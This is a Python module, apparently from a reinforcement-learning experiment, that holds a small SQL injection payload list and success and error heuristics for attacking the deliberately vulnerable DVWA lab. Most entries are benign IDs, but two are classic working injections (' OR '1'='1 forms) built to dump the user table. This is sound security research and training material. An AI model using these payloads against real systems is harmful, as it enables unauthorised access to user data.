from typing import List

# Harder payload library for SQLi.
# Idea:
# - Only a small subset are actually effective SQLi on DVWA-Low
# - Others are benign, invalid, or return no rows
#
# This makes random exploration weaker and gives RL something useful to learn.

SQLI_PAYLOADS: List[str] = [
    # Mostly benign / useless payloads
    "1",                  # valid ID, 1 row
    "2",                  # valid ID, 1 row
    "3",                  # valid ID, 1 row
    "4",                  # valid ID, 1 row
    "5",                  # valid ID, 1 row
    "abc",                # invalid
    "xyz",                # invalid
    "0 OR 1=0",           # no rows
    "' AND '1'='2",       # no rows
    "' AND '1'='1",       # likely single row or no rows
    # Actual SQLi payloads that should dump multiple rows
    "' OR '1'='1",        # classic SQLi
    "' OR '1'='1' -- ",   # classic SQLi with comment
]


def is_sqli_success(html: str) -> bool:
    """
    Heuristic: treat SQLi as 'success' only if we see multiple user rows.
    Uses count of 'First name' as a proxy.

    On DVWA-Low:
      - benign IDs like '1' usually show one row
      - proper SQLi typically shows the whole user table (many rows)
    """
    return html.count("First name") > 1


def has_error_indicator(html: str) -> bool:
    """
    Rough SQL error detector based on common patterns.
    """
    lowered = html.lower()
    return (
        "sql syntax" in lowered
        or "warning: mysql" in lowered
        or "you have an error in your sql" in lowered
    )
